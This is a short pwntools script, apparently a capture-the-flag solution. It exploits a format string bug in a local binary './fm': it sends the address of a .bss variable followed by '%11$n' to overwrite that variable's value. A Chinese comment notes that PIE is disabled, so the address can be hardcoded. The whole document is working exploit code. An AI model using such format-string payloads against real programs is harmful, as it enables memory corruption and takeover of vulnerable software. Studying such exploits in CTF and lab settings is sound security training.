from pwn import *

context.log_level = 'info'
io = process("./fm")

# x 在 .bss 但是本题没有开 PIE 直接写地址就可以篡改值
x_addr = 0x0804A02C

payload = p32(x_addr) + b"%11$n"

io.sendline(payload)
io.interactive()
